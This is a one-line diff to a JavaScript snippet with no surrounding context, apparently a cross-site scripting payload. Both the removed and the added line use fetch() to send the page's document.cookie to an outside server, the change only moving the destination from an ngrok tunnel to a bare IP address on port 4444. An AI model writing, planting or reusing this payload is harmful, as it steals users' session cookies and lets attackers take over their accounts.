@@ -1,1 +1,1 @@
-fetch("http://2.tcp.ngrok.io:11862/?c="+document.cookie);
+fetch("http://37.187.20.127:4444/?c="+document.cookie);
